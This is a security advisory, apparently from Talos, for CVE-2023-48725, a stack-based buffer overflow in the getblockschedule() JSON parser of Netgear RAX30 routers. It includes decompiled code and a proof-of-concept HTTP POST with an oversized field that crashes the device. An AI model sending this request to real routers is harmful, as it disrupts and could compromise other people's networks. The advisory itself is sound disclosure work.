## Netgear RAX30 JSON Parsing getblockschedule() stack-based buffer overflow vulnerability

##### March 7, 2024

##### CVE Number

CVE-2023-48725

##### SUMMARY

A stack-based buffer overflow vulnerability exists in the JSON Parsing getblockschedule() functionality of Netgear RAX30 1.0.11.96 and 1.0.7.78. A specially crafted HTTP request can lead to code execution. An attacker can make an authenticated HTTP request to trigger this vulnerability.

##### CONFIRMED VULNERABLE VERSIONS

The versions below were either tested or verified to be vulnerable by Talos or confirmed to be vulnerable by the vendor.

Netgear RAX30 1.0.11.96

Netgear RAX30 1.0.7.78

##### PRODUCT URLS

RAX30 - <https://www.netgear.com/support/product/rax30>

##### CVSSv3 SCORE

7.2 - CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H

##### CWE

CWE-121 - Stack-based Buffer Overflow

##### DETAILS

AX2400 WiFi Router (RAX30) is a home router created by Netgear.

There exists a vulnerability in the `getblockschedule` function. This is called from a function lookup table inside of the `main` function of the binary.

```
int32_t getblockschedule(struct json_object* json_obj)
{
    ...
    char s_3[0x100];
    if (json_object_object_get_ex(json_obj, "message", &message_output) == 0)
    {
        cmsUtl_strcpy(&s_3, json_object_get_string(json_obj)); // unbounded strcpy to static size buffer.
    }
...
}

```

This was triggered on a live device with the following payload:

```
POST /cgi-bin/rex_cgi?csrftoken=2053576656 HTTP/1.1
Host: 192.168.1.1
Content-Length: 999

{"function":"getblockschedule","data":{"notamesg":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}}

```

This request creates a crash of the client application due to a strcpy on an unchecked length into a stack-based buffer. This will occur whenever there is no `message` object inside of the data payload of the `getblockschedule`. This is entirely user controlled data.
